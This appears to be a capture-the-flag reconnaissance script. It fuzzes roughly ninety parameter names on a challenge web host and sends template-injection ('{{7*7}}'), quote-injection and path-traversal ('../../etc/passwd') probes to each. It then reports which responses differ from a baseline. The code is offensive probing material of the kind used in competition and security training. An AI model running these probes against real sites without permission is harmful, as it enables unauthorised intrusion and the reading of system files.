import requests, concurrent.futures as cf
requests.packages.urllib3.disable_warnings()
H="kicyber-2bccd62e5d76-granny-makes-food-0-0.chals.io"
URL=f"https://{H}/"
M="MK7Z9Q"
base=requests.get(URL,timeout=10,verify=False).text
params="user username name admin id page file url uri path dest redirect next target fetch load proxy host site view template tpl src source cmd command debug q query search s lang theme action do func function method data input value val key token role auth pass password msg message content text dir include inc render format output result callback cb json xml type mode item items food recipe order cart menu cook bake".split()
def t(p):
    for val in [M, "{{7*7}}", "MARKER'\"<>", "../../etc/passwd"]:
        try: r=requests.get(URL, params={p:val}, timeout=10, verify=False)
        except Exception as e: return (p,"ERR",str(e)[:50])
        if r.text!=base: return (p,val,r.status_code,len(r.content))
    return None
with cf.ThreadPoolExecutor(max_workers=25) as ex:
    for r in ex.map(t,params):
        if r: print("DIFF",r)
print("PARAM REFLECTION DONE")
